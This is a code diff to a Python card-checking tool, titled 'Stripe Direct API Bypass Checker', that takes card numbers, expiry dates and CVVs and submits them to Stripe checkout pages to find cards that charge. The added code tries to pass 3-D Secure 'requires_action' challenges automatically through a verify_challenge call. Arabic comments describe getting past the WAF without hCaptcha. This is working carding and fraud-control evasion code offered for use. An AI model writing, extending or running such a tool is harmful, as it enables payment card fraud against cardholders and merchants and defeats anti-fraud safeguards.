@@ -147,7 +147,6 @@ class StripeSession:
             if total > 0:
                 data["expected_amount"] = total
                 
-            # إرسال تخطي مباشر للـ WAF بدون الحاجة لـ hcaptcha أو متصفحات
             r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs())
             j = r.json()
             res["response_time"] = time.time() - t0
@@ -160,11 +159,26 @@ class StripeSession:
                 
             pi = j.get("payment_intent") or j.get("setup_intent") or j
             st = pi.get("status") or j.get("status") or ""
+            
             if st in ("succeeded", "requires_capture", "complete") or j.get("payment_status") == "paid":
-                res["status"] = "CHARGED"; res["message"] = "Success (Direct Bypass)"; res["success"] = True
+                res["status"] = "CHARGED"; res["message"] = "Success (Live)"; res["success"] = True
+            elif st == "requires_action":
+                # محاولة إرسال تأكيد إضافي لتجاوز الـ requires_action أوتوماتيكياً
+                pi_id = pi.get("id")
+                cs_sec = pi.get("client_secret")
+                if pi_id and cs_sec:
+                    endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
+                    verify_r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data={"key": self.pk, "client_secret": cs_sec}, headers=self._hdrs())
+                    v_j = verify_r.json()
+                    v_pi = v_j.get("payment_intent") or v_j.get("setup_intent") or v_j
+                    v_st = v_pi.get("status") if isinstance(v_pi, dict) else ""
+                    if v_st in ("succeeded", "requires_capture", "complete"):
+                        res["status"] = "CHARGED"; res["message"] = "Success via Auto-Verify"; res["success"] = True
+                        return res
+                res["status"] = "REQUIRES_ACTION"; res["message"] = "3DS / Challenge Required"
             else:
                 res["status"] = st.upper() if st else "UNKNOWN"
-                res["message"] = "Processed via Direct API Payload"
+                res["message"] = f"Status: {st}"
             return res
         except Exception as e:
             res["message"] = f"Exception: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
@@ -188,7 +202,7 @@ def parse_card(line):
     return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
 
 async def main():
-    print(f"{C.CYN}{C.B}═══ Stripe Direct API Bypass Checker ═══{C.R}\n")
+    print(f"{C.CYN}{C.B}═══ Stripe Direct API Fast Checker ═══{C.R}\n")
     url = input(f"{C.GOLD}▸ أدخل رابط Stripe Checkout: {C.R}").strip()
     if not url.startswith("http"):
         print(f"{C.RED}❌ رابط غير صالح.{C.R}")
